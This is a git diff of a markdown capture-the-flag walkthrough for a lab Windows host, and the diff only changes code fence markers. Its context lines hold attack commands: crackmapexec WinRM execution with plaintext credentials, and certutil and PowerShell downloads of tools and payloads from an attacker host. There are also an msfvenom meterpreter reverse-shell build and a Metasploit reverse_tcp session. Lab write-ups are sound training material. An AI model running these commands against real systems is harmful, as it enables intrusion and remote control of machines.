@@ -52,7 +52,7 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 57.48 seconds
 
-```bash
+```
 ```
 ares@legion:~$ curl -v http://$target 2>&1                                                                                                                                    
 *   Trying 10.10.11.106:80...
@@ -139,10 +139,10 @@ Transfer & run winpeas
 Methods
 ```bash
  crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "copy \\10.10.14.24\share\winPEASany.exe C:\Users\tony\Desktop\winpeas.exe"
-```bash
+```
 ```
  crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "certutil -urlcache -split -f http://10.10.14.24:8000/winPEASany.exe C:\Users\tony\Desktop\winpeas.exe"
-```bash
+```
 ```bash
  crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "powershell -c iwr -uri http://10.10.14.24:8000/winPEAS.exe -outfile C:\Users\tony\Desktop\winpeas.exe"
 ```bash
@@ -165,10 +165,10 @@ crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "type C:\Users\tony\AppDat
 Stageless msfvenom payload:
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f exe -o shell2.exe
-```bash
+```
 ```
 crackmapexec winrm 10.10.11.106 -u tony -p liltony -x "certutil -urlcache -split -f http://10.10.14.27:8000/shell2.exe C:\Users\tony\Desktop\shell2.exe"
-```bash
+```
 ```bash
 bundle exec evil-winrm.rb -i 10.10.11.106 -u tony -p 'liltony'
 
@@ -177,10 +177,10 @@ bundle exec evil-winrm.rb -i 10.10.11.106 -u tony -p 'liltony'
  Privesc
 ```
 use multi/recon/local_exploit_suggester
-```bash
+```
 ```bash
 set payload windows/x64/meterpreter/reverse_tcp 
 set session 1 
 set lhost tun0 
 run
-```bash
+```
